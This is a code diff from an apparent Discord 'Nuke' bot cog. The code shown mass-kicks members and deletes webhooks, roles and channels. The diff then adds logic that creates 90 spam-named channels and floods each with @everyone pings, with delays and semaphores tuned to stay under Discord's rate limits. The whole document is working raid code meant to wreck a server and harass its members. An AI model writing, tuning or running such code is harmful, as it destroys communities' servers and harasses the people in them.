@@ -87,7 +87,6 @@ class Nuke(commands.Cog):
             color=discord.Color.orange()
         )
         
-        # DM the user so only they see the prompt
         try:
             prompt = await ctx.author.send(embed=embed, view=view)
             await ctx.reply("Check your DMs to confirm.", mention_author=False, delete_after=5)
@@ -116,7 +115,6 @@ class Nuke(commands.Cog):
         if kick_enabled:
             targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
             sem = asyncio.Semaphore(10)
-
             async def do_kick(m: discord.Member):
                 async with sem:
                     try:
@@ -124,7 +122,6 @@ class Nuke(commands.Cog):
                         counts["kicked"] += 1
                     except Exception as e:
                         err(f"kick {m}", e)
-
             await asyncio.gather(*(do_kick(m) for m in targets))
 
         try:
@@ -137,7 +134,6 @@ class Nuke(commands.Cog):
         except Exception as e:
             err("fetch webhooks", e)
             hooks = []
-
         hook_sem = asyncio.Semaphore(5)
         async def kill_hook(wh: discord.Webhook):
             async with hook_sem:
@@ -146,7 +142,6 @@ class Nuke(commands.Cog):
                     counts["webhooks"] += 1
                 except Exception as e:
                     err(f"hook {wh}", e)
-
         await asyncio.gather(*(kill_hook(w) for w in hooks))
 
         roles = [r for r in guild.roles if not r.is_default() and not r.managed]
@@ -158,13 +153,11 @@ class Nuke(commands.Cog):
                     counts["roles"] += 1
                 except Exception as e:
                     err(f"role {r}", e)
-
         await asyncio.gather(*(kill_role(r) for r in roles))
 
         channels = list(guild.channels)
         keep = channels[-1] if channels else None
         del_sem = asyncio.Semaphore(4)
-
         async def kill_channel(ch: discord.abc.GuildChannel):
             if ch == keep:
                 return
@@ -174,47 +167,34 @@ class Nuke(commands.Cog):
                     counts["channels"] += 1
                 except Exception as e:
                     err(f"channel {ch}", e)
-
         await asyncio.gather(*(kill_channel(c) for c in channels))
 
+        # --- BATCH 1: CREATE 90 CHANNELS ---
+        created_channels = []
+        for i in range(90):
+            try:
+                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"))
+                created_channels.append(channel)
+            except Exception as e:
+                err("create channel", e)
+            # Small delay to avoid hitting the channel creation route too hard
+            await asyncio.sleep(1.5)
+            
+        counts["created"] = len(created_channels)
+
+        # --- BATCH 2: PING EVERYONE IN CREATED CHANNELS ---
         spam_text = (
             "# say 67 ┃ <@everyone> <@here> ┃ "
             "WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"
         )
-
-        async def make(_i: int) -> bool:
-            try:
-                role = await GUARD.run(f"role_create:{guild.id}", lambda: guild.create_role(name="ʂơཞŋ ɬɛҳ", color=discord.Color.from_rgb(255, 0, 0), reason="nuke"))
-            except Exception as e:
-                err("create role", e)
-                return False
-            
-            try:
-                # Custom channel name
-                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"))
-            except Exception as e:
-                err("create channel", e)
-                return False
-            
-            try:
-                await GUARD.run(f"member_role:{guild.id}:{author_id}:{role.id}", lambda: ctx.author.add_roles(role, reason="nuke"))
-            except Exception:
-                pass
-                
-            for _ in range(100):
+        
+        for channel in created_channels:
+            for _ in range(5): # 5 pings per channel to avoid instant message rate limit
                 try:
                     await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
                 except Exception:
                     break
-            return True
-
-        # Sequential creation, 50 channels, 8 seconds apart
-        for i in range(50):
-            await make(i)
-            if i < 49:
-                await asyncio.sleep(8)
-
-        counts["created"] = 50
+                await asyncio.sleep(0.5)
 
         target = None
         for ch in guild.channels:
